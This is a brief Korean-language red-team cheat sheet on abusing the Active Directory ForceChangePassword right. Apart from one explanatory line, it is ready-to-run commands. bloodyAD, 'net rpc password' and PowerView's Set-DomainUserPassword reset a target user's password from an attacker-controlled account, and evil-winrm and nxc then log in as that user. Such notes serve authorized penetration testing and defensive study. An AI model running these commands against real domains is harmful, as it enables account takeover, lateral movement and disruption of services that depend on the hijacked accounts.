# ForceChangePassword

현재 패스워드 없이 대상 유저의 패스워드를 강제 변경한다. 서비스 계정 대상 시 관련 서비스가 중단될 수 있으므로 주의한다.

```bash
bloodyAD --host <DC_IP> -d <도메인> -u <공격자계정> -p '<패스워드>' \
  set password <대상유저> 'NewPass123!'  # ← 수정

net rpc password <대상유저> 'NewPass123!' \
  -U <도메인>/<공격자계정>%'<패스워드>' \
  -S <DC_IP>

# 이후 로그인
evil-winrm -i <대상IP> -u <대상유저> -p 'NewPass123!'
nxc smb <대상IP> -u <대상유저> -p 'NewPass123!'
```

```powershell
Set-DomainUserPassword -Identity <대상유저> `
  -AccountPassword (ConvertTo-SecureString 'NewPass123!' -AsPlainText -Force) -Verbose
```